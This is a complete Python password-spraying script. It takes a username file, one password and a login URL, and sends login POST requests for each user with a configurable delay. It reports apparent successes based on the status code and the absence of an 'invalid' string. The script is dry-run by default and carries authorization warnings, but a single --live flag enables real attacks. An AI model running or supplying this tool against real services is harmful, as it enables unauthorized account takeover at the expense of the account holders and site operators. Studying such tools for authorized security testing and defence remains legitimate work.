#!/usr/bin/env python3

import argparse
import requests
import time
import sys

def spray_passwords(url, usernames, password, dry_run=True, delay=3):
    headers = {
        "User-Agent": "User1111/PasswordSpray"
    }

    for user in usernames:
        print(f"[~] Trying {user}:{password}")
        if dry_run:
            continue  # Do nothing
        try:
            response = requests.post(url, data={"username": user, "password": password}, headers=headers, timeout=10)
            if response.status_code == 200 and "invalid" not in response.text.lower():
                print(f"[+] Potential success: {user}:{password}")
            else:
                print(f"[-] Failed: {user}")
        except Exception as e:
            print(f"[!] Error trying {user}: {e}")
        time.sleep(delay)

def load_usernames(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="Safe and ethical password spraying tool for authorized use only.")
    parser.add_argument('-u', '--userfile', required=True, help="File with usernames, one per line")
    parser.add_argument('-p', '--password', required=True, help="Single password to spray")
    parser.add_argument('-t', '--target', required=True, help="Login URL to test against (e.g., http://localhost/login)")
    parser.add_argument('--delay', type=int, default=3, help="Delay between attempts in seconds (default: 3)")
    parser.add_argument('--live', action='store_true', help="Actually perform the spray (not just dry run)")

    args = parser.parse_args()

    print("### WARNING: This tool is for authorized testing only. ###")
    if not args.live:
        print("[!] Dry run only. Use --live to perform real requests.")
    else:
        print("[!] LIVE MODE ENABLED. Ensure you are authorized to test this target.")

    usernames = load_usernames(args.userfile)
    spray_passwords(args.target, usernames, args.password, dry_run=not args.live, delay=args.delay)

if __name__ == "__main__":
    main()
